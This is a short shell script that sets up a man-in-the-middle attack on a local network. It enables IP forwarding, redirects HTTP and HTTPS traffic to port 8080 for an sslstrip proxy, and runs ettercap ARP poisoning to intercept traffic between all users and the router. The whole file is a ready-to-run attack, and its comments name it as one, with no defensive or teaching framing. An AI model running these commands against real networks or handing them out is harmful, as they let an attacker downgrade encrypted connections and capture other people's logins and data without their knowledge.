# enable IP forwarding
echo "1" > /proc/sys/net/ipv4/ip_forward
# route SSL and POST requests to the port where sslstrip proxy runs (default: 8080)
echo "Rerouting from {80, 443} to 8080"
iptables -t nat -A PREROUTING -p tcp --destination-port 443 -j REDIRECT --to-port 8080
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
# intercept traffic between all the users and the router - performs MITM attack
ettercap -q -T -M arp